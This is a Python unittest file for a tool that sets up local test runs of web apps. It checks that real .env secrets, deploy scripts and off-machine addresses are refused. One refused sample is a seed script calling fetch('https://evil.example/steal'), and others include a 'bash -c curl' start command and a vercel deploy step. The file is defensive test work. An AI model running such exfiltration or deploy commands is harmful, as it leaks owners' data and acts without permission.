"""Automatic run setup (NS9.T3): found from the files, never a real .env, never a deploy, and the assistant's
proposals held to 127.0.0.1."""
import json
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from eaos import live_setup


def project(files):
    root = Path(tempfile.mkdtemp())
    for name, text in files.items():
        (root / name).parent.mkdir(parents=True, exist_ok=True)
        (root / name).write_text(text if isinstance(text, str) else json.dumps(text))
    return root


VITE_APP = {
    'app/package.json': {'name': 'shop', 'scripts': {'dev': 'vite', 'build': 'tsc && vite build', 'start': 'node server.js',
                                                     'lint': 'eslint .', 'test': 'vitest run', 'typecheck': 'tsc --noEmit',
                                                     'deploy': 'railway up', 'migrate': 'node migrate.js'},
                         'dependencies': {'react': '18', 'pg': '8'}, 'devDependencies': {'vite': '5'}},
    'app/package-lock.json': '{}',
    'app/.env.example': 'DATABASE_URL=\nSESSION_SECRET=\nSTRIPE_API_URL=https://api.stripe.com\nLOG_LEVEL=info\nFEATURE_X=true\n',
    'app/.env': 'SESSION_SECRET=the-real-production-secret\n',
    'app/src/main.ts': 'const u = import.meta.env.VITE_API_URL; const m = process.env.MAIL_TOKEN;\n',
}


class DetectTests(unittest.TestCase):
    def test_a_vite_app_in_app_is_found_with_everything_it_needs(self):
        found = live_setup.detect(project(VITE_APP))
        profile = found['profile']
        self.assertEqual(profile['app'], 'app')
        self.assertEqual(profile['install'], [['npm', 'ci', '--no-audit', '--no-fund']])
        self.assertEqual(profile['start'][:2], ['npx', 'vite'])
        self.assertIn('127.0.0.1', profile['start'])
        self.assertEqual(profile['checks'], [['npm', 'run', 'typecheck'], ['npm', 'run', 'lint'], ['npm', 'run', 'test']])
        self.assertEqual(profile['database'], {'kind': 'postgres', 'name': profile['database']['name']})
        self.assertEqual(profile['prepare'], [['npm', 'run', 'migrate']])
        self.assertEqual(profile['baseline']['build'], [['npm', 'run', 'build']])

    def test_values_are_the_runs_own_and_a_real_env_is_never_read(self):
        env = live_setup.detect(project(VITE_APP))['profile']['env']
        self.assertEqual(env['DATABASE_URL'], '{database_url}')
        self.assertNotEqual(env['SESSION_SECRET'], 'the-real-production-secret')
        self.assertGreater(len(env['SESSION_SECRET']), 30)
        self.assertEqual(env['STRIPE_API_URL'], 'http://127.0.0.1:9', 'a hosted service becomes an address nobody answers')
        self.assertEqual((env['LOG_LEVEL'], env['FEATURE_X']), ('info', 'true'))
        self.assertIn('VITE_API_URL', env)
        self.assertIn('MAIL_TOKEN', env)

    def test_a_script_that_deploys_never_runs_even_through_another_script(self):
        scripts = {'deploy': 'railway up', 'ship': 'npm run build && npm run deploy', 'build': 'vite build',
                   'reset': 'railway run node reset.js', 'start': 'node server.js'}
        self.assertFalse(live_setup.script_is_safe(scripts, 'deploy'))
        self.assertFalse(live_setup.script_is_safe(scripts, 'ship'))
        self.assertFalse(live_setup.script_is_safe(scripts, 'reset'))
        self.assertTrue(live_setup.script_is_safe(scripts, 'build'))
        found = live_setup.detect(project({'package.json': {'scripts': {'dev': 'vercel dev', 'start': 'node s.js'}}}))
        self.assertEqual(found['profile']['start'], ['npm', 'run', 'start'])

    def test_a_project_it_cannot_start_says_so(self):
        found = live_setup.detect(project({'main.py': 'print(1)\n'}))
        self.assertIsNone(found['profile'])
        self.assertTrue(found['limitations'])

    def test_supabase_is_named_as_a_limit_not_hidden(self):
        found = live_setup.detect(project({'package.json': {'scripts': {'dev': 'vite'},
                                                            'dependencies': {'@supabase/supabase-js': '2'}, 'devDependencies': {'vite': '5'}}}))
        self.assertTrue(any('Supabase' in l for l in found['limitations']))


class ProposalTests(unittest.TestCase):
    def test_an_address_off_this_computer_or_a_deploy_is_refused(self):
        self.assertEqual(live_setup.safe({'env': {'A': 'http://127.0.0.1:5000', 'DB': '{database_url}'},
                                          'start': ['npx', 'vite'], 'seed_script': "fetch('http://localhost:3000/x')"}), [])
        refused = live_setup.safe({'env': {'API': 'https://api.example.com'}, 'start': ['bash', '-c', 'curl x'],
                                   'prepare': [['npx', 'vercel', 'deploy']], 'seed_script': "fetch('https://evil.example/steal')"})
        self.assertEqual(len(refused), 4)
        for words in ('api.example.com', 'bash -c', 'vercel deploy', 'evil.example'):
            self.assertTrue(any(words in reason for reason in refused), words)

    def test_the_environment_is_replaced_and_an_empty_list_removes_a_step(self):
        runtime = Path(tempfile.mkdtemp())
        live_setup.write_profile(runtime, {'schema_version': 1, 'install': [['npm', 'ci']], 'start': ['npx', 'vite'], 'port': 1,
                                           'health': '/', 'env': {'OLD': '1', 'DATABASE_URL': '{database_url}'},
                                           'prepare': [['npm', 'run', 'migrate']], 'database': {'kind': 'postgres', 'name': 'x'}})
        profile = live_setup.apply(runtime, {'env': {'NEW': '2', 'DATABASE_URL': '{database_url}'}, 'prepare': [], 'database': 'none',
                                             'fixtures': {'E2E_ID': '7'}, 'seed_script': 'console.log(1)'})
        self.assertEqual(profile['env'], {'NEW': '2', 'E2E_ID': '7'})
        self.assertNotIn('prepare', profile)
        self.assertNotIn('database', profile)
        self.assertEqual(profile['seed'][0][0], 'node')
        self.assertTrue((runtime / 'setup/seed.cjs').is_file())
        self.assertEqual(oct((runtime / 'run.json').stat().st_mode & 0o777), '0o600')


    def test_a_production_proposal_changes_the_baseline_only(self):
        runtime = Path(tempfile.mkdtemp())
        live_setup.write_profile(runtime, {'schema_version': 1, 'install': [['npm', 'ci']], 'start': ['npx', 'vite'], 'port': 1,
                                           'health': '/', 'env': {'DEV': '1'},
                                           'baseline': {'build': [['npm', 'run', 'build']], 'start': ['npm', 'start'], 'env': {'OLD': '1'}}})
        profile = live_setup.apply(runtime, {'env': {'APP_URL': 'https://127.0.0.1:5', 'DATABASE_URL': '{database_url}'},
                                             'build': [['npm', 'run', 'build:server']], 'seed_script': 'x'}, mode='baseline')
        self.assertEqual(profile['env'], {'DEV': '1'}, 'the lock run is untouched')
        self.assertEqual(profile['baseline']['env'], {'APP_URL': 'https://127.0.0.1:5', 'DATABASE_URL': '{database_url}'})
        self.assertEqual(profile['baseline']['build'], [['npm', 'run', 'build:server']])
        self.assertNotIn('seed', profile, 'the load test signs nobody in')

    def test_a_value_naming_the_database_starts_one_even_when_none_was_declared(self):
        from eaos.live_run import LiveRun
        live = LiveRun.__new__(LiveRun)
        live.runtime, live.profile = Path(tempfile.mkdtemp()), {'env': {'DATABASE_URL': '{database_url}'}}
        with mock.patch('eaos.local_db.LocalPostgres') as database:
            database.return_value.create.return_value = 'postgresql://postgres@127.0.0.1:5/app'
            self.assertEqual(live.database_url(), 'postgresql://postgres@127.0.0.1:5/app')
        database.return_value.create.assert_called_once_with('app')

class VerifyTests(unittest.TestCase):
    def test_a_gate_in_front_of_every_screen_is_not_a_working_app(self):
        page = {'text': 'Where are you working?', 'others': [{'text': 'Where are you  working?'}, {'text': 'Where are you working?'}]}
        self.assertTrue(live_setup.stuck(page))
        page['others'][1]['text'] = 'People with access'
        self.assertFalse(live_setup.stuck(page))
        self.assertTrue(live_setup.signed_out({'url': 'http://127.0.0.1:5/login?next=/'}))
        self.assertTrue(live_setup.signed_out({'url': 'http://127.0.0.1:5/', 'password': 1}))

    def test_the_assistant_is_asked_until_it_works_and_what_is_left_is_written(self):
        runtime = Path(tempfile.mkdtemp())
        outcomes = iter([{'ok': False, 'failure': 'the first page asks for a sign-in', 'fixtures': {}},
                         {'ok': True, 'page': {'status': 200}, 'fixtures': {'E2E_ID': '1'}}])
        assistant = mock.Mock()
        assistant.complete.return_value = ({'result': {'env': {'DEV_LOGIN': '1'}, 'seed_script': 'console.log("{}")'}}, {})
        with mock.patch.object(live_setup, 'verify', side_effect=lambda *a, **k: next(outcomes)), \
                mock.patch.object(live_setup, 'assist_messages', return_value=[]), \
                mock.patch.object(live_setup, 'setup_baseline', return_value={'ok': False, 'failure': 'APP_URL must be https'}):
            result = live_setup.setup(project(VITE_APP), runtime, provider=assistant, say=lambda n: None)
        self.assertEqual((result['ok'], result['attempts']), (True, 2))
        self.assertIn('speed cannot be measured: APP_URL must be https', result['limitations'])
        self.assertEqual(json.loads((runtime / 'run.json').read_text())['env'], {'DEV_LOGIN': '1'})

    def test_the_production_run_is_verified_before_any_load_test_uses_it(self):
        runtime = Path(tempfile.mkdtemp())
        detected = live_setup.detect(project(VITE_APP))
        live_setup.write_profile(runtime, detected['profile'])
        outcomes = iter([{'ok': False, 'failure': 'npm exited with 1; it said: APP_URL must be https'}, {'ok': True}])
        assistant = mock.Mock()
        assistant.complete.return_value = ({'result': {'env': {'APP_URL': 'https://127.0.0.1:5'}}}, {})
        with mock.patch.object(live_setup, 'verify', side_effect=lambda *a, **k: next(outcomes)) as runs:
            record = live_setup.setup_baseline(project(VITE_APP), runtime, detected, assistant, say=lambda n: None)
        self.assertTrue(record['ok'])
        self.assertTrue(all(call.kwargs.get('mode') == 'baseline' for call in runs.call_args_list))
        profile = json.loads((runtime / 'run.json').read_text())
        self.assertEqual((profile['baseline']['verified'], profile['baseline']['env']), (True, {'APP_URL': 'https://127.0.0.1:5'}))

    def test_without_an_assistant_the_failure_is_a_written_limit(self):
        runtime = Path(tempfile.mkdtemp())
        with mock.patch.object(live_setup, 'verify', return_value={'ok': False, 'failure': 'the first page asks for a sign-in', 'fixtures': {}}):
            result = live_setup.setup(project(VITE_APP), runtime, provider=None, say=lambda n: None)
        self.assertFalse(result['ok'])
        self.assertTrue(any('sign-in' in l for l in result['limitations']))


class SeedFixtureTests(unittest.TestCase):
    def test_the_values_a_seed_prints_join_the_run(self):
        from eaos.live_run import LiveRun
        live = LiveRun.__new__(LiveRun)
        live.profile, live.fixtures, live._extra = {'seed': [['node', 'seed.cjs']]}, {}, {'PATH': '/bin'}
        live.run = mock.Mock(return_value=(0, 'signed in\n{"E2E_PROFILEID": "p1", "other": "x"}\n', ''))
        self.assertEqual(live.seed('http://127.0.0.1:5'), {'E2E_PROFILEID': 'p1'})
        self.assertEqual(live.extra()['E2E_PROFILEID'], 'p1')


class LocalDatabaseTests(unittest.TestCase):
    def test_a_database_of_the_runs_own_on_loopback(self):
        from eaos.local_db import LocalPostgres, binaries
        if binaries() is None: self.skipTest('no PostgreSQL binaries')
        db = LocalPostgres(tempfile.mkdtemp())
        try:
            url = db.create('shop')
            self.assertRegex(url, r'^postgresql://postgres@127\.0\.0\.1:\d+/shop$')
            self.assertEqual(db.start().rsplit('/', 1)[0], url.rsplit('/', 1)[0], 'a running server is reused')
        finally:
            db.stop()
        self.assertIsNone(db.running())


class AssistantTests(unittest.TestCase):
    def test_the_installed_assistant_is_used_and_none_means_none(self):
        from eaos.runtime import assistants
        with mock.patch.object(assistants.shutil, 'which', side_effect=lambda n: '/bin/codex' if n == 'codex' else None):
            name, provider = assistants.provider()
        self.assertEqual(name, 'codex')
        self.assertIn('eaos.runtime.codex_adapter', provider.config['argv'])
        with mock.patch.object(assistants.shutil, 'which', return_value=None):
            self.assertEqual(assistants.provider(), (None, None))


if __name__ == '__main__':
    unittest.main()


class InvariantTests(unittest.TestCase):
    def test_setting_up_never_writes_the_project_folder(self):
        root = project(VITE_APP)
        before = sorted((p.relative_to(root).as_posix(), p.read_bytes()) for p in root.rglob('*') if p.is_file())
        runtime = Path(tempfile.mkdtemp())
        with mock.patch.object(live_setup, 'verify', return_value={'ok': True, 'page': {}, 'fixtures': {}}), \
                mock.patch.object(live_setup, 'setup_baseline', return_value={'ok': True}):
            live_setup.setup(root, runtime, provider=None, say=lambda n: None)
        live_setup.apply(runtime, {'env': {'A': '1'}, 'seed_script': 'console.log(1)'})
        after = sorted((p.relative_to(root).as_posix(), p.read_bytes()) for p in root.rglob('*') if p.is_file())
        self.assertEqual(before, after)

    def test_the_load_baseline_never_runs_the_dev_server(self):
        dev_start = {'scripts': {'build': 'vite build', 'start': 'vite', 'dev': 'vite'}, 'devDependencies': {'vite': '5'}}
        build, start = live_setup.production_commands('npm', dev_start, 4000)
        self.assertEqual(start[:3], ['npx', 'vite', 'preview'])
        self.assertEqual(live_setup.production_commands('npm', {'scripts': {'dev': 'node x'}}, 4000), (None, None))

    def test_the_owners_database_address_is_never_used(self):
        from eaos.live_run import LiveRun
        live = LiveRun.__new__(LiveRun)
        live.runtime, live.profile = Path(tempfile.mkdtemp()), {'database': {'kind': 'postgres', 'name': 'shop'},
                                                                'env': {'DATABASE_URL': '{database_url}'}}
        with mock.patch.dict('os.environ', {'DATABASE_URL': 'postgres://owner@production.example/live'}), \
                mock.patch('eaos.local_db.LocalPostgres') as database:
            database.return_value.create.return_value = 'postgresql://postgres@127.0.0.1:5/shop'
            self.assertEqual(live.extra()['DATABASE_URL'], 'postgresql://postgres@127.0.0.1:5/shop')


class GuidedNoteTests(unittest.TestCase):
    def test_unsaved_edits_are_said_once_and_never_stop_the_run(self):
        import subprocess
        from eaos import guided
        root = project({'a.txt': 'x'})
        for args in (('init', '-q'), ('add', '-A'), ('-c', 'user.name=t', '-c', 'user.email=t@t', 'commit', '-qm', 'x')):
            subprocess.run(['git', '-C', str(root), *args], check=True)
        state = {'project': str(root), 'lang': 'en'}
        self.assertIsNone(guided._saved_note(state))
        (root / 'a.txt').write_text('y')
        self.assertIn('last saved version', guided._saved_note(state))


class CodexAdapterTests(unittest.TestCase):
    def test_codex_reads_only_what_eaos_sends_changes_nothing_and_needs_no_key(self):
        from eaos.runtime import codex_adapter

        def fake(argv, **kwargs):
            Path(argv[argv.index('-o') + 1]).write_text('{"action": "final"}')
            return mock.Mock(returncode=0)
        with mock.patch.object(codex_adapter.subprocess, 'run', side_effect=fake) as run:
            self.assertEqual(codex_adapter.call([{'role': 'user', 'content': 'hi'}]), {'action': 'final'})
        argv, kwargs = run.call_args.args[0], run.call_args.kwargs
        self.assertEqual(argv[argv.index('-s') + 1], 'read-only')
        for flag in ('--ephemeral', '--ignore-rules', '--ignore-user-config', '--skip-git-repo-check'):
            self.assertIn(flag, argv)
        self.assertNotIn('env', kwargs)


class SourceTests(unittest.TestCase):
    def test_the_assistant_sees_the_code_that_raised_the_error_not_the_build(self):
        root = project({'app/package.json': {'scripts': {'dev': 'vite'}},
                        'app/server/config.ts': '\n'.join(['// config'] * 5 + ['if (!url.startsWith("https://")) problems.push("APP_URL must be an https:// address in production.");']),
                        'app/dist-server/main.mjs': 'problems.push("APP_URL must be an https:// address in production.");'})
        found = live_setup.relevant_source(root, 'app', 'Error: Configuration is not valid:\n - APP_URL must be an https:// address in production.')
        self.assertIn('app/server/config.ts', found)
        self.assertNotIn('dist-server', found)
        self.assertEqual(live_setup.relevant_source(root, 'app', 'short'), '')
